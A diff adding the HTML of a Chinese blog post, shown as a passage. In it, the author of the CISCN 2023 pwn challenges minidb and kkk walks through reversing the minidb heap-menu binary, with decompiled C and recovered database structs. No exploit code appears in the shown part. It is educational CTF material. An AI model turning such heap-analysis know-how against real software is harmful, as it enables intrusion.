@@ -1,0 +1,876 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="arttnba3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="经典出题没人愿意做">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTF.0x03】CISCN 2023 华东北分区赛 minidb、kkk 出题手记">
+<meta property="og:url" content="http://blog.arttnba3.cn/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/index.html">
+<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:description" content="经典出题没人愿意做">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/07/14/PXEealsdIFTGgUA.png">
+<meta property="article:published_time" content="2023-07-14T01:43:35.000Z">
+<meta property="article:modified_time" content="2023-07-14T02:03:08.909Z">
+<meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Linux Kernel">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="CISCN">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/07/14/PXEealsdIFTGgUA.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>【CTF.0x03】CISCN 2023 华东北分区赛 minidb、kkk 出题手记 - arttnba3&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>arttnba3&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+                rss
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://s2.loli.net/2023/07/07/FxDjcunlpgbYWvQ.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【CTF.0x03】CISCN 2023 华东北分区赛 minidb、kkk 出题手记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-14 09:43" pubdate>
+          2023年7月14日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          29k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          245 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【CTF.0x03】CISCN 2023 华东北分区赛 minidb、kkk 出题手记</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年7月14日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>经典出题没人愿意做</p>
+<span id="more"></span>
+
+<h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>第一次帮国赛出题（<del>主要是听说有💴恰</del>），不出意外的话应该也是本科阶段最后一次出 CTF Pwn 题目了，同时这也是笔者第一次出 AWDP 的题目，感觉还是有点意思的 ：）</p>
+<p>因为短时间内确实是想不出什么新东西了所以出了两道比较套路化的题目，可惜解题率似乎有点不尽人意，估计大佬们应该都不屑于做笔者出的烂题吧 :（</p>
+<h1 id="0x01-minidb（简单）"><a href="#0x01-minidb（简单）" class="headerlink" title="0x01. minidb（简单）"></a>0x01. minidb（简单）</h1><p>这道题出题时的难度设置便是 <code>简单</code> ，所以笔者是按照签到题的难度去出的，不过虽然成功 <code>fix</code> 的队伍不少，但是成功 <code>break</code> 的队伍似乎并如预期不多🤔（<del>修都修了打还不会打🐎，你们是不是偷偷藏了什么👴不知道的通防手段</del>）</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先还是惯例修个跳表：</p>
+<p><img src="https://s2.loli.net/2023/07/07/VpuMXz3L9vFgiRC.png" srcset="/img/loading.gif" lazyload alt="IDA 修复跳表.png"></p>
+<p>提供了两层堆菜单，第一层可以让用户创建、使用、删除、展示、重命名数据库：</p>
+<p><img src="https://s2.loli.net/2023/07/12/tbZT75vorwOKMnj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1547</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_139F();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    v2 = v1;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">5</span> )<br>    &#123;<br>LABEL_6:<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>        <span class="hljs-keyword">continue</span>;<br>LABEL_15:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">5</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    <span class="hljs-keyword">switch</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_15;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_1D38();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = sub_2080();<br>        <span class="hljs-keyword">if</span> ( v3 )<br>          sub_1451(v3);<br>        v3 = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_21C1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_23EA();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        sub_247F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_6;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">666</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中数据库的创建会分配两个 chunk，一个用作数据库本体，另一个用作数据库的名字：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1D38</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">void</span> **v5; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_6088 )<br>    dword_6088 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( dword_608C &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !qword_6060[i] )<br>      &#123;<br>        v5 = (<span class="hljs-type">void</span> **)&amp;qword_6060[i];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    ptr = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">0x810</span>uLL);<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the name of database: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s2);<br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( qword_6060[j] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(qword_6060[j] + <span class="hljs-number">8LL</span>), s2) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] There&#x27;s already another database with the same name!\x1B[0m&quot;</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>      &#125;<br>      v4 = <span class="hljs-built_in">strlen</span>(s2);<br>      *((_QWORD *)ptr + <span class="hljs-number">1</span>) = <span class="hljs-built_in">malloc</span>(v4 + <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( *((_QWORD *)ptr + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(*((<span class="hljs-type">char</span> **)ptr + <span class="hljs-number">1</span>), s2);<br>        *(_BYTE *)(*((_QWORD *)ptr + <span class="hljs-number">1</span>) + v4) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now you can set the type of your databse. Here&#x27;s available choices:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. int32 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. int64 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. int32 to str[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. int64 to strr[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(Note that the string should end with a &#x27;\\0&#x27;, so the max length of input is 127/255)&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the type of database: &quot;</span>);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>        <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; v1 )<br>        &#123;<br>          *(_DWORD *)ptr = v1;<br>          *v5 = ptr;<br>          ++dword_608C;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Succesfully create a new database with name \&quot;%s\&quot;!\n&quot;</span>, s2);<br>          <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid type of database!\x1B[0m&quot;</span>);<br>        <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">1</span>));<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db name!\x1B[0m&quot;</span>);<br>      &#125;<br>LABEL_24:<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db!\x1B[0m&quot;</span>);<br>    &#125;<br>    *v5 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] You&#x27;ve already got too many databases!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>第二层堆菜单则提供了对数据库内键值对数据的增加、查询、更新、删除操作：</p>
+<p><img src="https://s2.loli.net/2023/07/12/yEmj24xGUVwt7Os.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1451</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_13FE();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    v3 = v2;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">666</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_1C47(a1);<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-keyword">switch</span> ( v3 )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            sub_1A81(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            sub_1712(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            sub_19BD(a1);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-number">666</span> );<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中判断是否存在重复键的逻辑如下，可以看出数据储存方式是哈希表 + 单向链表：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_168D</span><span class="hljs-params">(__int64 a1, __int64 a2, _QWORD *a3)</span><br>&#123;<br>  _QWORD *v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  _QWORD *v5; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v4 = *(_QWORD **)(a1 + <span class="hljs-number">8</span> * ((<span class="hljs-type">unsigned</span> __int8)a2 + <span class="hljs-number">2LL</span>)); <span class="hljs-comment">/* hash to %256 */</span><br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2 == v4[<span class="hljs-number">1</span>] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a3 )<br>        *a3 = v5;<br>      <span class="hljs-keyword">return</span> v4;<br>    &#125;<br>    v5 = v4;<br>    v4 = (_QWORD *)*v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由此我们可以逆向出数据库与键值对的结构体定义分别如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int64_t</span> key;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0</span>]; <span class="hljs-comment">/* 128 or 256 here */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">database</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> type;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">kv</span>[256];</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
